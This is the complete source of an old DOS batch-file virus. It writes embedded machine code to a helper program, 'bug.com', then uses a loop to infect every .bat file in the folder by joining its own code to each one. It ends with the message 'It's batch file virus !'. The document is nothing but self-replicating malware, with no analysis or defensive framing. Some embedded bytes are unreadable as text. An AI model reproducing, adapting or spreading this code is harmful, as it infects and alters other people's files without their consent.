@echo off
if exist bug.com goto infection
echo 1���G1۳H��1�J����!t:Gt8�t���!F:t�:t�1����! ���u��!��!�ƴL�!>bug.tmp
copy bug.tmp /a bug.com >nul
if exist %0.bat set name=%0.bat
if exist %0 set name=%0
for %%a in (*.bat) do call %name% %%a
del bug.*
goto start
:infection
bug <%1 >nul
if errorlevel 255 goto end
bug <%1 >bug.tmp
bug <%name% >%1
copy %1+bug.tmp /b %1 >nul
echo :end>>%1
goto end
:start
echo on
:�
@echo     Don't panic !
@echo It's batch file virus !
:end
